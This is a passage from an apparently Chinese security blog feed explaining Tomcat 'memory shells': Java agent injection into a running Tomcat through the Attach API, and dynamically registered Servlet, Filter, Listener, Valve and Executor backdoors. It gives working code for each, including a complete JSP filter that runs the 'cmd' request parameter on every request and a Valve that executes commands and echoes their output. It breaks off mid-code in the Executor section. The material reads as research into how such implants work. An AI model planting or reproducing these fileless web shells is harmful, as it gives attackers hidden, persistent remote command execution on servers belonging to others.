&lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;                &lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt;                &lt;version&gt;3.3.0&lt;/version&gt;                &lt;configuration&gt;                    &lt;archive&gt;                        &lt;manifestEntries&gt;                            &lt;Agent-Class&gt;org.example.AgentMain&lt;/Agent-Class&gt;                            &lt;Can-Redefine-Classes&gt;true&lt;/Can-Redefine-Classes&gt;                            &lt;Can-Retransform-Classes&gt;true&lt;/Can-Retransform-Classes&gt;                                             &lt;/manifestEntries&gt;                    &lt;/archive&gt;                    &lt;descriptorRefs&gt;                        &lt;descriptorRef&gt;jar-with-dependencies&lt;/descriptorRef&gt;                    &lt;/descriptorRefs&gt;                &lt;/configuration&gt;                &lt;executions&gt;                    &lt;execution&gt;                        &lt;id&gt;make-assembly&lt;/id&gt;                        &lt;phase&gt;package&lt;/phase&gt;                        &lt;goals&gt;                            &lt;goal&gt;single&lt;/goal&gt;                        &lt;/goals&gt;                    &lt;/execution&gt;                &lt;/executions&gt;            &lt;/plugin&gt;        &lt;/plugins&gt;    &lt;/build&gt;</code></pre><p>打包完成后得到两个jar，使用的是第二个，第一个没有依赖，而且MANIFEST.MF不完整</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230906113952195.png" alt="image-20230906113952195"></p><p>得到jar后，需要一个程序将这个jar注入到想要的进程中</p><pre><code class="java">package org.example;import com.sun.tools.attach.VirtualMachine;import com.sun.tools.attach.VirtualMachineDescriptor;import java.util.List;public class Main &#123;    public static void main(String[] args) throws Exception&#123;        String path = &quot;agentDemo-1.0-SNAPSHOT-jar-with-dependencies.jar&quot;;//路径        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();//遍历正在运行的JVM        for (VirtualMachineDescriptor v:list)&#123;            System.out.println(v.id()+&quot;  &quot;+v.displayName());            if (v.displayName().contains(&quot;org.apache.catalina.startup.Bootstrap&quot;))&#123;//判断是否为目标进程                // 将 jvm 虚拟机的 pid 号传入 attach 来进行远程连接                VirtualMachine vm = VirtualMachine.attach(v.id());                // 将我们的jar 发送给虚拟机                vm.loadAgent(path);                vm.detach();                System.out.println(&quot;OK&quot;);            &#125;        &#125;    &#125;&#125;</code></pre><p>代码编写到这就完成了</p><p>尝试运行：</p><p>首先运行一个tomcat项目，使用命令<code>jps - l</code>可以看到运行的java进程和pid</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230906114815445.png" alt="image-20230906114815445"></p><p>这个<code>org.apache.catalina.startup.Bootstrap</code>就是运行的tomcat 进程，如果是其他名字，需要去修改一下上面的Main函数代码</p><p>然后运行注入代码即可，因为没写注入成功的提示，所有没有任何反应</p><p>命令执行测试：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230906115359672.png" alt="image-20230906115359672"></p><p>因为调用了两次doFilter，所以弹出两次计算器</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230906115526506.png" alt="image-20230906115526506"></p><p>因为执行命令ipconfig 会出现一些中文字符，返回会报错，所有要修改优化一下返回结果的代码</p><p>修改一下下面的代码即可</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230906142511637.png" alt="image-20230906142511637"></p><p>修改后：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230906142727571.png" alt="image-20230906142727571"></p><p>由于内存马要求无文件落地，这里把注入的jar删除掉，ma还是能够正常运行的</p>]]></content>
      
      
      
        <tags>
            
            <tag> 内存马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat内存马</title>
      <link href="/2023/08/28/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2023/08/28/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="Tomcat内存马"><a href="#Tomcat内存马" class="headerlink" title="Tomcat内存马"></a>Tomcat内存马</h1><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692693168658-7d57c5bf-e47a-40e6-8103-aecffb58fa90.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692932556217-c10363e6-55fb-43a8-bbba-afec2ce3f84e.png"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/5.png" alt="img"></p><h2 id="Servlet内存马"><a href="#Servlet内存马" class="headerlink" title="Servlet内存马"></a>Servlet内存马</h2><p>下面是基于动态注册Servlet的内存马实现</p><p>首先要了解Servlet是如何被注册的，注册的过程是怎样的。<br>按照正常的实现Servlet，是需要在web.xml里面进行配置的，如：</p><pre><code class="xml">&lt;servlet&gt;  &lt;servlet-name&gt;Test&lt;/servlet-name&gt;  &lt;servlet-class&gt;Test&lt;/servlet-class&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt;  &lt;servlet-name&gt;Test&lt;/servlet-name&gt;  &lt;url-pattern&gt;/test&lt;/url-pattern&gt;&lt;/servlet-mapping&gt;</code></pre><p>要实现动态注册，那就要先去了解这个web.xml是如何被解析并且获取servlet的</p><p>解析web.xml的类是org.apache.catalina.startup.ContextConfig的webConfig()方法<br>这个方法的具体逻辑，在英文注释中说的很清楚了，概括起来包括以下两点：<br>:::info<br>1.合并Tomcat全局web.xml 、当前应用中的web.xml 、web-fragment.xml和web应用的注解中的配置信息<br>2.将解析出的各种配置信息（如Servlet配置、Filter配置、Listener配置等）关联到Context对象中<br>:::<br>而上面提到的第二点，是通过configureContext方法完成的，依次读取了 Filter、Listenert、Servlet的配置及其映射</p><p>这里逻辑就比较清晰了，就是调用Context的add方法、set方法配置Context<br>例如解析Servlet配置的代码：<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692686079197-712369cf-0327-4c0b-a0dd-757b60622425.png" alt="image.png"></p><p>首先获取web.xml中所有的<code>&lt;servlet&gt;</code>标签下的<code>&lt;servlet-name&gt;</code>和<code>&lt;servlet-class&gt;</code>，然后遍历所有的servlet<br>每次遍历都会创建一个wrapper对象，this.context是StandardContext<br>如果xml中设置了优先级LoadOnStartUp(没设置默认是-1)，则进行设置，<br>:::info<br>load-on-startup 这个元素的含义是在服务器启动的时候就加载这个servlet(实例化并调用init()方法).这个元素中的可选内容必须为一个整数,表明了这个servlet被加载的先后顺序.当是一个负数时或者没有指定时，则表示服务器在该servlet被调用时才加载。当值为0或者大于0时，表示服务器在启动时就加载这个servlet.该容器肯定可以保证被标记为更小的整数的servlet比被标记为更大的整数的servlet更先被调用,还可已选择同样的load-on-start-up值来夹在servlets.<br>补充:正数的值越小，启动该servlet的优先级越高<br>:::<br>然后根据xml存储servlet Name ，也就是<code>&lt;servlet-name&gt;</code>部分</p><p>下面的代码是设置init()参数，没有就跳过</p><pre><code class="java">Map&lt;String, String&gt; params = servlet.getParameterMap();var7 = params.entrySet().iterator();while(var7.hasNext()) &#123;    Map.Entry&lt;String, String&gt; entry = (Map.Entry)var7.next();    wrapper.addInitParameter((String)entry.getKey(), (String)entry.getValue());&#125;</code></pre><p>往下就是将<code>&lt;servlet-class&gt;</code>放到wrapper里<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692686782367-391064d4-bb99-4136-a122-d3d571449190.png" alt="image.png"></p><p>配置好wrapper后添加到Context里 ，然后到处理路由绑定部分，也就是<servlet-mapping><br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692686897063-1c36e134-4ec3-401e-899e-d50b5328012e.png" alt="image.png"><br>循环遍历所有的mapping使用this.context.addServletMappingDecoded()将url路径和servlet类做映射。(这里的&#x2F;test、Test就是我们在Mapper中设置的值)</p><p>servlet注册流程：</p><ol><li>通过 context.createWapper() 创建 Wapper 对象；</li><li>设置 Servlet 的 LoadOnStartUp(优先级) 的值；</li><li>设置 Servlet 的 Name；</li><li>设置 Servlet 对应的 Class；</li><li>通过addChild()将创建并配置好的 Wrapper 添加到 Context 中</li><li>通过addServletMappingDecoded()将 url 路径和 servlet 类做映射。</li></ol><p>现在还有一个问题没解决，就是创建Wapper 对象的this.context(StandardContext)如何获取？<br>这个似乎要根据具体环境来定，如果是在jsp的环境下，可以通过request对象用反射获取<br>例如request对象存在一个getServletContext()方法 ，调试发现其获取到的是ApplicationContext<br>:::info<br>ServletContext servletContext &#x3D; request.getServletContext();<br>:::<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692689171584-67906858-c940-4726-b011-a5e74ee404d4.png" alt="image.png"><br>在这个ApplicationContext里面就能找到StandardContext<br>获取StandardContext的代码如下</p><pre><code class="java">ServletContext servletContext = request.getServletContext();Field Context = servletContext.getClass().getDeclaredField(&quot;context&quot;);Context.setAccessible(true);ApplicationContext applicationContext =(ApplicationContext) Context.get(servletContext);Field stcontext = applicationContext.getClass().getDeclaredField(&quot;context&quot;);stcontext.setAccessible(true);StandardContext standardContext = (StandardContext) stcontext.get(applicationContext);</code></pre><p>还可以这样获取：</p><pre><code class="java">Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);reqF.setAccessible(true);Request req = (Request) reqF.get(request);StandardContext stdcontext = (StandardContext) req.getContext();</code></pre><p>然后就是根据上面的流程进行注册servlet<br>先写个马</p><pre><code class="java">&lt;%!public class Memshell extends HttpServlet &#123;@Overrideprotected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;    Runtime.getRuntime().exec(&quot;calc&quot;);&#125;@Overrideprotected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;&#125;&#125;%&gt;</code></pre><p>获取StandardContext</p><pre><code class="java">ServletContext servletContext = request.getServletContext();Field Context = servletContext.getClass().getDeclaredField(&quot;context&quot;);Context.setAccessible(true);ApplicationContext applicationContext =(ApplicationContext) Context.get(servletContext);Field stcontext = applicationContext.getClass().getDeclaredField(&quot;context&quot;);stcontext.setAccessible(true);StandardContext standardContext = (StandardContext) stcontext.get(applicationContext);</code></pre><p>注册</p><pre><code class="java">Wrapper wrapper = standardContext.createWrapper();wrapper.setName(&quot;aaa&quot;);wrapper.setServletClass(Memshell.class.getName());wrapper.setLoadOnStartup(1);wrapper.setServlet(new Memshell()); //实例化servlet对象standardContext.addChild(wrapper);standardContext.addServletMappingDecoded(&quot;/shell&quot;,&quot;aaa&quot;);</code></pre><p>利用的时候，先访问这个恶意的jsp，让servlet先注册进去，再访问这个内存马路径&#x2F;shell<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692689991992-c52b3b8d-23c7-4933-8575-e1aa97789688.png" alt="image.png"></p><h2 id="Filter内存马"><a href="#Filter内存马" class="headerlink" title="Filter内存马"></a>Filter内存马</h2><p> 这里的逻辑是也是参考了tomcat处理web.xml中filter配置进行注册filter的过程，</p><pre><code class="xml">&lt;filter&gt;  &lt;filter-name&gt;TestFilter&lt;/filter-name&gt;  &lt;filter-class&gt;TestFilter&lt;/filter-class&gt;&lt;/filter&gt;&lt;filter-mapping&gt;  &lt;filter-name&gt;TestFilter&lt;/filter-name&gt;  &lt;url-pattern&gt;/test&lt;/url-pattern&gt;&lt;/filter-mapping&gt;</code></pre><p>也是在org.apache.catalina.startup.ContextConfig的configureContext()方法<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692762725809-114e568c-f4aa-4efc-9d92-a9508b1fe0db.png" alt="image.png"></p><p>主要有两步context.addFilterDef和context.addFilterMap，其中context还是StandardContext<br>filter是FilterDef对象，可以根据调试内容进行创建修改值<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692763018269-4f58fcb5-dc30-44e5-96d6-1f90b2f98cb4.png" alt="image.png"><br>主要是设置了filterName和filterClass，可以使用反射修改，但是这里不需要这么麻烦，FilterDef提供了set方法进行设置</p><pre><code class="java">FilterDef filter = new FilterDef();filter.setFilterName(&quot;MemFilter&quot;);filter.setFilterClass(MemFilter.class.getName());filter.setAsyncSupported(&quot;false&quot;);filter.setFilter(new MemFilter());//实例化</code></pre><p>还有filterMap,这个是FilterMap对象，用于filter绑定路径<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692763453454-056dab1f-319c-49e3-9bbe-81808491d070.png" alt="image.png"></p><pre><code class="java">FilterMap filterMap = new FilterMap();filterMap.setFilterName(&quot;MemFilter&quot;);filterMap.addURLPattern(&quot;/*&quot;);</code></pre><p>然后就是获取StandardContext,将filter进行注册</p><pre><code class="java">standardContext.addFilterDef(filter);standardContext.addFilterMap(filterMap);</code></pre><p>看似已经完成注册了，实际上还有许多步骤没有完成<br>调试往下会发现，在org.apache.catalina.core.StandardContext#filterStart中</p><pre><code class="java">public boolean filterStart() &#123;    if (this.getLogger().isDebugEnabled()) &#123;        this.getLogger().debug(&quot;Starting filters&quot;);    &#125;    boolean ok = true;    synchronized(this.filterConfigs) &#123;        this.filterConfigs.clear();        Iterator var3 = this.filterDefs.entrySet().iterator();        while(var3.hasNext()) &#123;            Map.Entry&lt;String, FilterDef&gt; entry = (Map.Entry)var3.next();            String name = (String)entry.getKey();            if (this.getLogger().isDebugEnabled()) &#123;                this.getLogger().debug(&quot; Starting filter &#39;&quot; + name + &quot;&#39;&quot;);            &#125;            try &#123;                ApplicationFilterConfig filterConfig = new ApplicationFilterConfig(this, (FilterDef)entry.getValue());                this.filterConfigs.put(name, filterConfig);            &#125; catch (Throwable var8) &#123;                Throwable t = ExceptionUtils.unwrapInvocationTargetException(var8);                ExceptionUtils.handleThrowable(t);                this.getLogger().error(sm.getString(&quot;standardContext.filterStart&quot;, new Object[]&#123;name&#125;), t);                ok = false;            &#125;        &#125;        return ok;    &#125;&#125;</code></pre><p>首先对filterDefs进行foreach，可以看到这是一个HashMap，对应是&lt;key,Object&gt;，具体是过滤器名称和FilterDef对象<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692773155501-6efda5bd-7063-494a-bb17-a89a51c7f70e.png" alt="image.png"><br>再往下，对filterConfigs这个HashMap设置ApplicationFilterConfig<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692773252581-a0d6750d-af63-4551-bd90-4c0e7f5ac996.png" alt="image.png"></p><p>所以要给 this.filterConfigs加点小料 ，this是StandardContext</p><p>因为ApplicationFilterConfig类不为public类型，所以只能通过反射进行创建对象，filterConfigs也是私有属性，也只能通过反射设置</p><pre><code class="java">Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);constructor.setAccessible(true);ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filter);Field filterConfigsField = StandardContext.class.getDeclaredField(&quot;filterConfigs&quot;);filterConfigsField.setAccessible(true);Map filterConfigs = (Map) filterConfigsField.get(standardContext);filterConfigs.put(&quot;MemFilter&quot;, filterConfig);</code></pre><p>完整代码如下：</p><pre><code class="java">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.Context&quot; %&gt;&lt;%@ page import=&quot;java.util.Map&quot; %&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;%!public class MemFilter implements Filter &#123;    public void init(FilterConfig config) throws ServletException &#123;    &#125;    public void destroy() &#123;    &#125;    @Override    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException &#123;        String c = request.getParameter(&quot;cmd&quot;);        if(!c.isEmpty())        &#123;            Runtime.getRuntime().exec(c);        &#125;        chain.doFilter(request, response);    &#125;&#125;%&gt;&lt;%ServletContext servletContext = request.getServletContext();Field context = servletContext.getClass().getDeclaredField(&quot;context&quot;);context.setAccessible(true);ApplicationContext applicationContext =(ApplicationContext) context.get(servletContext);Field stcontext = applicationContext.getClass().getDeclaredField(&quot;context&quot;);stcontext.setAccessible(true);StandardContext standardContext = (StandardContext) stcontext.get(applicationContext);FilterDef filter = new FilterDef();filter.setFilterName(&quot;MemFilter&quot;);filter.setFilterClass(MemFilter.class.getName());filter.setAsyncSupported(&quot;false&quot;);filter.setFilter(new MemFilter());standardContext.addFilterDef(filter);FilterMap filterMap = new FilterMap();filterMap.setFilterName(&quot;MemFilter&quot;);filterMap.addURLPattern(&quot;/*&quot;);//filterMap.setDispatcher(DispatcherType.REQUEST.name());standardContext.addFilterMap(filterMap);Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);constructor.setAccessible(true);ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filter);Field filterConfigsField = StandardContext.class.getDeclaredField(&quot;filterConfigs&quot;);filterConfigsField.setAccessible(true);Map filterConfigs = (Map) filterConfigsField.get(standardContext);filterConfigs.put(&quot;MemFilter&quot;, filterConfig);%&gt;</code></pre><p>注入成功<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692774514297-968b4d07-f607-45a7-8929-2285dffb679c.png" alt="image.png"></p><p>按照网上的文章，上面的代码还缺少了一句,目前还不知道是干嘛用的</p><pre><code class="java">filterMap.setDispatcher(DispatcherType.REQUEST.name());</code></pre><p>setDispatcher的代码如下：</p><pre><code class="java">public void setDispatcher(String dispatcherString) &#123;String dispatcher = dispatcherString.toUpperCase(Locale.ENGLISH);if (dispatcher.equals(DispatcherType.FORWARD.name())) &#123;    this.dispatcherMapping |= 2;&#125; else if (dispatcher.equals(DispatcherType.INCLUDE.name())) &#123;    this.dispatcherMapping |= 4;&#125; else if (dispatcher.equals(DispatcherType.REQUEST.name())) &#123;    this.dispatcherMapping |= 8;&#125; else if (dispatcher.equals(DispatcherType.ERROR.name())) &#123;    this.dispatcherMapping |= 1;&#125; else if (dispatcher.equals(DispatcherType.ASYNC.name())) &#123;    this.dispatcherMapping |= 16;&#125;&#125;</code></pre><h2 id="Listener内存马"><a href="#Listener内存马" class="headerlink" title="Listener内存马"></a>Listener内存马</h2><p>Servlet 规范中定义了 8 个监听器接口，可以用于监听 ServletContext、HttpSession 和 ServletRequest 对象的生命周期和属性变化事件  <a href="http://c.biancheng.net/servlet2/listener.html">http://c.biancheng.net/servlet2/listener.html</a><br>但因为内存马本身的特殊性, 一般选用 ServletRequestListener 接口</p><p>简单写一个listener,在web.xml配置好</p><pre><code class="xml">&lt;listener&gt;  &lt;listener-class&gt;TestListener&lt;/listener-class&gt;&lt;/listener&gt;</code></pre><p>同样的在org.apache.catalina.startup.ContextConfig的configureContext()方法中<br>相关代码只有这点<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692845665551-3d3b5129-ee6c-4b5a-99fa-0f4231c4c92e.png" alt="image.png"><br>但是context.addApplicationListener接受的参数是字符串，即listener的类名，猜测是通过名字进行实例化</p><p>在StandardContext的这个类下的listenerStart里面<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692847758368-626f907c-b677-4ffb-bf1d-0bcc8844934b.png" alt="image.png"><br>首先获取刚刚存储的类名，然后实例化保存到results里面</p><p>然后往下，这里会判断listener的类型进行添加到eventListeners数组里面<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692848575750-7f250864-f366-4aae-aced-22238947b933.png" alt="image.png"><br>然后调用了setApplicationEventListeners()添加到applicationEventListenersList里面<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692849156795-7ff25b7b-b53c-4d09-ae73-23f557ae8300.png" alt="image.png"></p><pre><code class="java">public void setApplicationEventListeners(Object[] listeners) &#123;    this.applicationEventListenersList.clear();    if (listeners != null &amp;&amp; listeners.length &gt; 0) &#123;        this.applicationEventListenersList.addAll(Arrays.asList(listeners));    &#125;&#125;</code></pre><p>然后在fireRequestInitEvent()方法中调用了getApplicationEventListeners()，又把eventListeners数组掏出来了<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692849376736-6ef8904a-847b-4e54-ae61-696bcfff78cb.png" alt="image.png"><br>往下调用listener.requestInitialized(event)，执行了listener的requestInitialized方法进行初始化</p><p>所以只要将实例化后的listener对象放到ApplicationEventListeners数组里就可以了，StandardContext自带了个addApplicationEventListener方法</p><pre><code class="java">public void addApplicationEventListener(Object listener) &#123;this.applicationEventListenersList.add(listener);&#125;</code></pre><p>先写个ServletRequestListener马,把马写到requestInitialized方法里，这样每次发起请求的初始化就会调用requestInitialized</p><pre><code class="javascript">&lt;%!  public class memListener implements ServletRequestListener &#123;  @Override    public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;  &#125;  @Override    public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;      try &#123;        Runtime.getRuntime().exec(&quot;calc&quot;);      &#125; catch (IOException e) &#123;        throw new RuntimeException(e);      &#125;    &#125;&#125;%&gt;</code></pre><p>获取StandardContext</p><pre><code class="java">ServletContext servletContext = request.getServletContext();Field context = servletContext.getClass().getDeclaredField(&quot;context&quot;);context.setAccessible(true);ApplicationContext applicationContext =(ApplicationContext) context.get(servletContext);Field stcontext = applicationContext.getClass().getDeclaredField(&quot;context&quot;);stcontext.setAccessible(true);StandardContext standardContext = (StandardContext) stcontext.get(applicationContext);</code></pre><p>实例化注册</p><pre><code class="java">standardContext.addApplicationEventListener(new memListener());</code></pre><p>效果<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692859023422-fed1e404-20e0-403a-bf68-373da3b7c741.png" alt="image.png"></p><h2 id="Valve内存马"><a href="#Valve内存马" class="headerlink" title="Valve内存马"></a>Valve内存马</h2><p>Tomcat 在处理一个请求调用逻辑时，是如何处理和传递 Request 和 Respone 对象的呢？为了整体架构的每个组件的可伸缩性和可扩展性，Tomcat 使用了职责链模式来实现客户端请求的处理。在 Tomcat 中定义了两个接口：Pipeline（管道）和 Valve（阀）。这两个接口名字很好的诠释了处理模式：数据流就像是流经管道的水一样，经过管道上个一个个阀门。<br>Pipeline 中会有一个最基础的 Valve（basic），它始终位于末端（最后执行），封装了具体的请求处理和输出响应的过程。Pipeline 提供了 addValve 方法，可以添加新 Valve 在 basic 之前，并按照添加顺序执行。</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692863686421-af66acb0-6cc0-4381-b69b-eb4c43cbdbc0.png" alt="image.png"><br>Tomcat 每个层级的容器（Engine、Host、Context、Wrapper），都有基础的 Valve 实现（StandardEngineValve、StandardHostValve、StandardContextValve、StandardWrapperValve），他们同时维护了一个 Pipeline 实例（StandardPipeline)，也就是说，我们可以在任何层级的容器上针对请求处理进行扩展。这四个 Valve 的基础实现都继承了 ValveBase</p><p>看看Pipeline接口，继承了Contained接口</p><pre><code class="java">public interface Pipeline extends Contained &#123;     public Valve getBasic();     public void setBasic(Valve valve);     public void addValve(Valve valve);     public Valve[] getValves();     public void removeValve(Valve valve);     public void findNonAsyncValves(Set&lt;String&gt; result);&#125;</code></pre><p>Pipeline接口提供了各种对Valve的操作方法，可以通过addValve()方法来添加一个Valve<br>在StandardHostValve中可以看到 invoke是获取StandardContext的valve<br>然后再每一个invoke()里面又会递归调用<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692865525658-665889c8-0cd8-4825-b564-20e9da1f2b18.png" alt="image.png"></p><p>在Valve的接口中就给了getNext()</p><pre><code class="java">public interface Valve &#123;     public Valve getNext();     public void setNext(Valve valve);     public void backgroundProcess();     public void invoke(Request request, Response response)        throws IOException, ServletException;     public boolean isAsyncSupported();&#125;</code></pre><p>可以通过getNext()获取下一个valve, 利用getNext().invoke(request, response)往下进行连接</p><p>Valve是通过重写invoke方法实现主要逻辑的</p><pre><code class="java">class memValve extends ValveBase &#123;         @Override        public void invoke(Request request, Response response) throws IOException, ServletException &#123;            ...            &#125;&#125;</code></pre><p>invoke 方法加入我们的恶意代码，由于可以拿到 Request 和 Response 方法，所以也可以做一些参数上的处理或者回显。然后使用 StandardContext 中的 pipeline 属性的 addValve 方法进行注册<br>所以实现内存马步骤如下：</p><ol><li>写个马</li></ol><pre><code class="java">class memValve extends ValveBase &#123;        @Override        public void invoke(Request request, Response response) throws IOException, ServletException &#123;           String cmd = request.getParameter(&quot;cmd&quot;);            if (cmd != null)            &#123;                Process process = Runtime.getRuntime().exec(cmd);                BufferedReader bufferedReader = new BufferedReader(                        new InputStreamReader(process.getInputStream()));                StringBuilder stringBuilder = new StringBuilder();                String line;                while ((line = bufferedReader.readLine()) != null)                &#123;                    stringBuilder.append(line + &#39;\n&#39;);                &#125;                response.getOutputStream().write(stringBuilder.toString().getBytes());                response.getOutputStream().flush();                response.getOutputStream().close();                return;            &#125;                        this.getNext().invoke(request, response); //往下连接        &#125;    &#125;</code></pre><p>为了不影响后面程序的运行加上<br>this.getNext().invoke(request, response);</p><ol start="2"><li>获取StandardContext</li></ol><pre><code class="java">Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);reqF.setAccessible(true);Request req = (Request) reqF.get(request);StandardContext stdcontext = (StandardContext) req.getContext();</code></pre><ol start="3"><li>动态注册</li></ol><pre><code class="java">stdcontext.getPipeline().addValve(new memValve());</code></pre><p>效果如下：<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692866904458-9449aed0-29f3-4dfb-94de-ca379ebbea87.png" alt="image.png"></p><h2 id="Executor内存马"><a href="#Executor内存马" class="headerlink" title="Executor内存马"></a>Executor内存马</h2><p>一个Tomcat中是有一个Server，一个Server下有好几个Service，一个Service有多个Connector和一个Container，Connector是负责处理连接相关的事情，Container用于封装和管理Servlet和处理Request请求。<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692932925271-a199836f-f035-481b-b063-dc33e1ea247d.png"><br>Connector主要由ProtocolHandler与Adapter构成<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692934101493-58fb97b3-56f3-4848-9576-5bf895df868d.png" alt="image.png"><br>ProtocolHandler 主要由Endpoint和Processor组成<br>Endpoint有五大组件：</p><ul><li>LimitLatch：连接控制器，负责控制最大的连接数</li><li>Acceptor：负责接收新的连接，然后返回一个Channel对象给Poller</li><li>Poller：可以将其看成是NIO中Selector，负责监控Channel的状态</li><li>SocketProcessor：可以看成是一个被封装的任务类</li><li><strong>Executor：Tomcat自己扩展的线程池，用来执行任务类</strong></li></ul><p>Executor是一种可以在Tomcat组件之间进行共享的连接池<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692944869959-22ffaef6-eb0b-4830-b48a-61a66fccc119.png" alt="image.png"><br>在Tomcat中Executor由Service维护，因此同一个Service中的组件可以共享一个线程池。如果没有定义任何线程池，相关组件( 如Endpoint)会自动创建线程池，此时，线程池不再共享。</p><p>在<strong>org.apache.tomcat.util.net.NioEndpoint.Poller</strong>中<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692945570597-626d89ec-f33f-4465-aa3d-213449051cd3.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692945699899-f1c9e4ec-9539-4b29-b5f1-4596738b920b.png" alt="image.png"><br>如果Executor没有，就会调用createExecutor来创建Executor<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692945680610-cdee15ae-dcd0-4735-85ff-93d28c3bb0eb.png" alt="image.png"><br>这里是直接实例化EndPoint自己启动的TreadPoolExecutor类，这个类是Executor的子类</p><p>创建后如何使用？<br>在org.apache.tomcat.util.net.NioEndpoint.Poller的run方法中<br>通过调用events方法，来判断是否还有Pollerevent事件，如果有就将其取出，然后把里面的Channel取出来注册到该Selector中，然后不断轮询所有注册过的Channel查看是否有事件发生。当有事件发生时，则调用SocketProcessor交给Executor执行。<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692946739094-0fc341af-fac6-4c08-987e-41637abcf179.png" alt="image.png"><br>然后来看processKey方法，processKey()这个方法主要通过调用processSocket()方法创建一个SocketProcessor，然后丢到Tomcat线程池中去执行。每个Endpoint都有自己的SocketProcessor实现，从Endpoint的属性中可以看到，这个Processor也有缓存机制。 总结一下Poller所做的事：遍历PollerEvents队列，将每个事件中的通道感兴趣的事件注册到Selector，当事件就绪时，创建一个SocketProcessor或者从缓存中取出一个SocketProcessor，然后放到线程池执行或者直接执行它的run方法执行。<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692947016367-c54629c9-eef0-45fb-abd4-7ad97d76ee16.png" alt="image.png"><br>跟进，来到org.apache.tomcat.util.net.AbstractEndpoint<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692947446891-f5366eea-a986-48b8-abf3-cd5a205fb154.png" alt="image.png"><br>综上，只需要新建一个类继承自TreadPoolExecutor类，然后把恶意的逻辑重写到execute方法即可</p><p>那问题来了，如何将新建的类添加到NioEndpoint里，使得this.getExecutor()能够获取到想要的executor<br>在AbstractEndpoint中存在一个setExecutor方法，NioEndpoint继承了AbstractEndpoint，所以只要调用setExecutor就行</p><pre><code class="java">public void setExecutor(Executor executor) &#123;    this.executor = executor;    this.internalExecutor = executor == null;&#125;</code></pre><p>新建类，继承ThreadPoolExecutor</p><pre><code class="java">public class memThreadExcutor extends ThreadPoolExecutor &#123;    public memThreadExcutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) &#123;      super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);    &#125;...    @Override    public void execute(Runnable command) &#123;...      this.execute(command, 0L, TimeUnit.MILLISECONDS);    &#125;  